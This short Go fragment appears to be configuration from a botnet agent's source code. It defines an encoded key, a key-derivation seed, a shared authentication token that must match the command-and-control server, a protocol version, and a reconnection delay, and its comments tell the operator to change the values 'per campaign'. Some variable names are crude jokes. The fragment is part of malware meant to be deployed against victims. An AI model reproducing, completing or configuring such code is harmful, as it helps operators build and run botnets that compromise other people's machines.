...
const gothTits = "rarJGgyPdf2Q+wECi5T+XN2kbqaLMWc8pUqwrvo=" //change me run setup.py

// cryptSeed is the 8-char hex seed used for key derivation.
const cryptSeed = "b3021745" //change me run setup.py

// magicCode is the shared auth token — must match CNC.
const magicCode = "2$IicIfr@vY9ureJ" //change this per campaign

// protocolVersion must match the CNC's protocol version string.
const protocolVersion = "proto57" //change this per campaign

// fancyBear is the delay between reconnection attempts.
var fancyBear = 5 * time.Second
